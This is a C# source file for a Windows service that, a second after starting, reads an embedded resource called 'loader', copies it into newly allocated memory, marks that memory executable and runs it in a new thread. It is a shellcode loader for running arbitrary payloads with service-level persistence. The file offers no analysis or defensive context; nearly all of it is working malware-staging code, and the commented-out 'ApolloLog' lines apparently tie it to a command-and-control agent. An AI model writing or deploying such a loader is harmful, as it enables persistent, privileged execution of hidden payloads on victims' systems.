using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime;
using System.Timers;
using static WindowsService1.Service1;
namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_READWRITE = 0x40;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParam, uint dwCreationFlags, ref uint lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        public enum ServiceState
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ServiceStatus
        {
            public int dwServiceType;
            public ServiceState dwCurrentState;
            public int dwControlsAccepted;
            public int dwWin32ExitCode;
            public int dwServiceSpecificExitCode;
            public int dwCheckPoint;
            public int dwWaitHint;
        };
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
        private EventLog _eventLog1;
        public Service1()
        {
            //_eventLog1 = new EventLog();
            //if (!EventLog.SourceExists("ApolloLog"))
            //{
            //    EventLog.CreateEventSource("ApolloLog", "MyApolloLog");
            //}
            //_eventLog1.Source = "ApolloLog";
            //_eventLog1.Log = "MyApolloLog";
            //_eventLog1.WriteEntry($"about to initialize");
            InitializeComponent();
        }
        protected override void OnStart(string[] args)
        {
            //_eventLog1.WriteEntry($"OnStart");
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            //serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
            Timer timer = new Timer();
            timer.Interval = 1000;
            timer.AutoReset = false;
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();
        }
        protected override void OnStop()
        {

        }
        public void OnTimer(object sender, ElapsedEventArgs args)
        {
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
            byte[] shellcode = GetResource("loader");
            if (shellcode.Length > 0)
            {
                //_eventLog1.WriteEntry($"shellcode length: {shellcode.Length}");
                IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
                if (funcAddr != IntPtr.Zero)
                {
                    //_eventLog1.WriteEntry($"funcAddr: {funcAddr}");
                    Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;
                    uint oldprotection;
                    bool success = VirtualProtect(funcAddr, shellcode.Length, PAGE_EXECUTE_READ, out oldprotection);
                    if (success)
                    {
                        hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, funcAddr, pinfo, 0, ref threadId);
                        //_eventLog1.WriteEntry($"created thread: {hThread}");
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                        //_eventLog1.WriteEntry($"thread exited");
                    }
                    else
                    {
                        //_eventLog1.WriteEntry($"failed to do virtual protect: {success}");
                    }
                }
                else
                {
                    //_eventLog1.WriteEntry($"failed to do virtual alloc: {funcAddr}");
                }

            }

        }
        private static byte[] GetResource(string name)
        {
            string resourceFullName = null;
            if ((resourceFullName = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames().FirstOrDefault(N => N.Contains(name))) != null)
            {

                Stream reader = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceFullName);
                byte[] ba = new byte[reader.Length];
                reader.Read(ba, 0, ba.Length);
                return ba;
            }
            return null;
        }
    }
}
